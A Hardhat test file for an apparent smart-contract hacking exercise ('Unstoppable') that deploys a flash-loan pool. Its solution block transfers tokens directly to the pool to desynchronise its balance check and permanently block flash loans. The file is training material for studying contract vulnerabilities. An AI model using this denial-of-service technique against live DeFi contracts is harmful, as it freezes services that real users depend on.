const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Unstoppable", function () {
    let deployer, player, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
    const INITIAL_PLAYER_TOKEN_BALANCE = ethers.utils.parseEther("100");

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory(
            "DamnValuableToken",
            deployer
        );
        const UnstoppableLenderFactory = await ethers.getContractFactory(
            "UnstoppableLender",
            deployer
        );

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);

        expect(await this.token.balanceOf(this.pool.address)).to.equal(
            TOKENS_IN_POOL
        );

        expect(await this.token.balanceOf(player.address)).to.equal(
            INITIAL_PLAYER_TOKEN_BALANCE
        );

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory(
            "ReceiverUnstoppable",
            someUser
        );
        this.receiverContract = await ReceiverContractFactory.deploy(
            this.pool.address
        );
        await this.receiverContract.executeFlashLoan(10);
    });

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */
        await this.token.connect(player).transfer(this.pool.address, 50);
        const poolBal = await this.token.balanceOf(this.pool.address);
        console.log("token balance of pool on token contract:", poolBal);

        const AtackerContractFactory = await ethers.getContractFactory(
            "ReceiverUnstoppable",
            player
        );

        this.attackerContract = await AtackerContractFactory.deploy(
            this.pool.address
        );

        const poolBalance = await this.pool.poolBalance();
        console.log("poolBalance variable on pool contract:,", poolBalance);

        // await this.attackerContract.connect(player).executeFlashLoan(50);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted;
    });
});
